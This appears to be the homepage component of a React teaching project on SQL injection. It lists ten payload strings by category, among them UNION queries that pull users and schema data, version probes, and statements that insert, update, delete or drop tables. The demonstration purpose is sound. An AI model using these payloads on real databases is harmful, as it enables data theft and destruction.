import React from 'react';
import { Link } from 'react-router-dom';
import { 
  Shield, 
  ArrowRight
} from 'lucide-react';

const HomePage = () => {
  const attackTypes = [
    // CATEGORY 1: DATA EXFILTRATION & SCHEMA
    {
      name: 'UNION Attack - Users',
      description: 'Extract all users from the database using UNION',
      example: "'UNION ALL SELECT 999, username, email, NOW() FROM users --",
      category: 'Data Exfiltration & Schema',
      databases: ['PostgreSQL', 'MySQL', 'SQLite']
    },
    {
      name: 'Schema Discovery - Tables',
      description: 'Discover all tables in the database',
      example: "'UNION ALL SELECT 999, table_name, 'N/A', NOW() FROM information_schema.tables WHERE table_schema = 'public' --",
      category: 'Data Exfiltration & Schema',
      databases: ['PostgreSQL', 'MySQL'],
      note: 'SQLite: .tables or pragma table_info()'
    },
    {
      name: 'User Enumeration - System',
      description: 'List all system users',
      example: "UNION ALL SELECT 999, usename, usesysid::text, NOW() FROM pg_user",
      category: 'Data Exfiltration & Schema',
      databases: ['PostgreSQL'],
      note: 'MySQL: SELECT User, Host FROM mysql.user'
    },

    // CATEGORY 2: DATABASE INFORMATION
    {
      name: 'System Info - Version',
      description: 'Get database version information',
      example: "'UNION ALL SELECT 999, version()::text, current_database()::text, current_user::text --",
      category: 'Database Information',
      databases: ['PostgreSQL'],
      note: 'MySQL: SELECT VERSION(), DATABASE(), USER()'
    },
    {
      name: 'Database Stats',
      description: 'Get database statistics',
      example: "'UNION ALL SELECT 999, pg_size_pretty(pg_database_size(current_database())), 'N/A', NOW() --",
      category: 'Database Information',
      databases: ['PostgreSQL'],
      note: 'MySQL: SELECT table_schema, SUM(data_length) FROM information_schema.tables'
    },

    // CATEGORY 3: TABLE/SCHEMA CREATION
    {
      name: 'Create Table Attack',
      description: 'Attempt to create a new table in the database',
      example: "'; CREATE TABLE hacked_table (id SERIAL, data TEXT); --",
      category: 'Table/Schema Creation',
      databases: ['PostgreSQL', 'MySQL', 'SQLite']
    },
    {
      name: 'Insert Data Attack',
      description: 'Attempt to insert malicious data into the database',
      example: "'; INSERT INTO users (username, email) VALUES ('hacker', 'hacked@evil.com'); --",
      category: 'Table/Schema Creation',
      databases: ['PostgreSQL', 'MySQL', 'SQLite']
    },

    // CATEGORY 4: DATA DELETION
    {
      name: 'Delete Data Attack',
      description: 'Attempt to delete all data from users table',
      example: "'; DELETE FROM users; --",
      category: 'Data Deletion',
      databases: ['PostgreSQL', 'MySQL', 'SQLite']
    },
    {
      name: 'Drop Table Attack',
      description: 'Attempt to completely remove the users table',
      example: "'; DROP TABLE users; --",
      category: 'Data Deletion',
      databases: ['PostgreSQL', 'MySQL', 'SQLite']
    },
    {
      name: 'Update Attack',
      description: 'Attempt to modify all user emails',
      example: "'; UPDATE users SET email = 'hacked@evil.com'; --",
      category: 'Data Deletion',
      databases: ['PostgreSQL', 'MySQL', 'SQLite']
    }
  ];

  return (
    <div className="min-h-screen">
      {/* Hero Section */}
      <section className="hero">
        <div className="max-w-7xl mx-auto px-8 py-24">
          <div className="text-center">
            <div className="flex justify-center mb-8">
              <div className="w-20 h-20 bg-gradient-to-r from-primary-600 to-primary-800 rounded-2xl flex items-center justify-center shadow-soft">              </div>
            </div>
            
            <h1 className="text-4xl md:text-6xl font-bold mb-6">
            
              <span className="text-white">SQL Injection</span>
              <br />
             
            </h1>
            
            <p className="text-xl mb-8 max-w-3xl mx-auto">
            Security project that demonstrates SQL Injection vulnerabilities.
            </p>
            
            <div className="flex flex-col sm:flex-row gap-4 justify-center">
           
            </div>
          </div>
        </div>
      </section>

      {/* Attack Types Section */}
      <section className="py-20 bg-white">
        <div className="max-w-7xl mx-auto px-8">
          <div className="text-center mb-16">
      
                    <h2 className="text-3xl md:text-4xl font-bold text-gray-900 mb-4">
                    SQL Injection Attack Types
            </h2>
            
          </div>
          
          {/* Organized Categories */}
          <div className="space-y-12">
            {/* CATEGORY 1: DATA EXFILTRATION & SCHEMA */}
            <div>
              <h3 className="text-2xl font-bold text-red-700 mb-6 text-center bg-red-50 px-4 py-2 rounded-lg border border-red-200">
                Data Exfiltration & Schema
              </h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {attackTypes
                  .filter(attack => attack.category === 'Data Exfiltration & Schema')
                  .map((attack, index) => (
                    <div key={index} className="card-hover">
                      <h4 className="text-lg font-semibold text-gray-900 mb-3">
                        {attack.name}
                      </h4>
                      <p className="text-gray-600 mb-3">
                        {attack.description}
                      </p>
                      <div className="bg-gray-100 text-gray-800 p-3 rounded-lg font-mono text-sm overflow-x-auto border">
                        <code>{attack.example}</code>
                      </div>
                      
                      {/* Compatibilidad con bases de datos */}
                      <div className="mt-3 flex flex-wrap gap-2">
                        {attack.databases.map((db, dbIndex) => (
                          <span key={dbIndex} className="px-2 py-1 text-xs rounded-full font-medium bg-blue-100 text-blue-800">
                            {db}
                          </span>
                        ))}
                      </div>
                      
                      {/* Nota alternativa si existe */}
                     
                    </div>
                  ))}
              </div>
            </div>

            {/* CATEGORY 2: DATABASE INFORMATION */}
            <div>
              <h3 className="text-2xl font-bold text-blue-700 mb-6 text-center bg-blue-50 px-4 py-2 rounded-lg border border-blue-200">
                Database Information
              </h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {attackTypes
                  .filter(attack => attack.category === 'Database Information')
                  .map((attack, index) => (
                    <div key={index} className="card-hover">
                      <h4 className="text-lg font-semibold text-gray-900 mb-3">
                        {attack.name}
                      </h4>
                      <p className="text-gray-600 mb-3">
                        {attack.description}
                      </p>
                      <div className="bg-gray-100 text-gray-800 p-3 rounded-lg font-mono text-sm overflow-x-auto border">
                        <code>{attack.example}</code>
                      </div>
                      
                      {/* Compatibilidad con bases de datos */}
                      <div className="mt-3 flex flex-wrap gap-2">
                        {attack.databases.map((db, dbIndex) => (
                          <span key={dbIndex} className="px-2 py-1 text-xs rounded-full font-medium bg-blue-100 text-blue-800">
                            {db}
                          </span>
                        ))}
                      </div>
                      
                     
                    </div>
                  ))}
              </div>
            </div>

            {/* CATEGORY 3: TABLE/SCHEMA CREATION */}
            <div>
              <h3 className="text-2xl font-bold text-purple-700 mb-6 text-center bg-purple-50 px-4 py-2 rounded-lg border border-purple-200">
                Table/Schema Creation
              </h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {attackTypes
                  .filter(attack => attack.category === 'Table/Schema Creation')
                  .map((attack, index) => (
                    <div key={index} className="card-hover">
                      <h4 className="text-lg font-semibold text-gray-900 mb-3">
                        {attack.name}
                      </h4>
                      <p className="text-gray-600 mb-3">
                        {attack.description}
                      </p>
                      <div className="bg-gray-100 text-gray-800 p-3 rounded-lg font-mono text-sm overflow-x-auto border">
                        <code>{attack.example}</code>
                      </div>
                      
                      {/* Compatibilidad con bases de datos */}
                      <div className="mt-3 flex flex-wrap gap-2">
                        {attack.databases.map((db, dbIndex) => (
                          <span key={dbIndex} className="px-2 py-1 text-xs rounded-full font-medium bg-blue-100 text-blue-800">
                            {db}
                          </span>
                        ))}
                      </div>
                      
                     
                    </div>
                  ))}
              </div>
            </div>

            {/* CATEGORY 4: DATA DELETION */}
            <div>
              <h3 className="text-2xl font-bold text-yellow-700 mb-6 text-center bg-blue-50 px-4 py-2 rounded-lg border border-yellow-200">
                Data Deletion
              </h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {attackTypes
                  .filter(attack => attack.category === 'Data Deletion')
                  .map((attack, index) => (
                    <div key={index} className="card-hover">
                      <h4 className="text-lg font-semibold text-gray-900 mb-3">
                        {attack.name}
                      </h4>
                      <p className="text-gray-600 mb-3">
                        {attack.description}
                      </p>
                      <div className="bg-gray-100 text-gray-800 p-3 rounded-lg font-mono text-sm overflow-x-auto border">
                        <code>{attack.example}</code>
                      </div>
                      
                      {/* Compatibilidad con bases de datos */}
                      <div className="mt-3 flex flex-wrap gap-2">
                        {attack.databases.map((db, dbIndex) => (
                          <span key={dbIndex} className="px-2 py-1 text-xs rounded-full font-medium bg-blue-100 text-blue-800">
                            {db}
                          </span>
                        ))}
                      </div>
                      
                      {/* Nota alternativa si existe */}
                      {attack.note && (
                        <div className="mt-2 p-2 bg-yellow-50 border border-yellow-200 rounded text-sm text-yellow-800">
                          <strong>Alternativa:</strong> {attack.note}
                        </div>
                      )}
                    </div>
                  ))}
              </div>
            </div>
          </div>
        </div>
      </section>

    </div>
  );
};

export default HomePage;
